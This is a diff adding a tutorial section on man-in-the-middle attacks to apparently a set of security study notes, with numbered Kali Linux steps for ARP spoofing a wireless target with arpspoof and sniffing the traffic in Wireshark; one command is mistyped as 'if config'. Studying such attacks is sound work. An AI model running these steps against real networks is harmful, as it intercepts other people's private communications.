@@ -31,4 +31,24 @@ The whole idea behind this attack is to deny a service, in order to do that we t
 **Privilege Escalation:** Get more privileges in a system in order to do evil or malicious stuff.  
 
 ## Man in the Middle
-    
+A man in the middle (MITM) attack is one where the attacker (in our example, Mallory) secretly captures and relays communication between two parties who believe they are directly communicating with each other (in our example, Alice and Bob).  
+
+![alt text](https://witestlab.poly.edu/blog/content/images/2016/03/mitm-illustration.svg)  
+
+### How to perform an MITM attack with ARP spoofing over a wireless network  
+
+1. Setup ip forwarding on KALI Machine.
+	* The ip_forward file is set to 0 by default and we have to change it to 1.  
+	`echo 1 > /proc/sys/net/ipv4/ip_forward`  
+2. Know our default gateway or ip address of our router.  
+	`ip route`
+3. Know the interface on which we are going to perform this attack.  
+	`if config` (in our case is wlo1)  
+4. Start the attack with arpspoof.  
+	`arpspoof -i [interface] -t [ipTarget] -r [defaultGateway]`  
+5. Sniff information with Wireshark.  
+
+[See More complex example](https://www.youtube.com/watch?v=7PqMPhItKPM)  
+
+
+
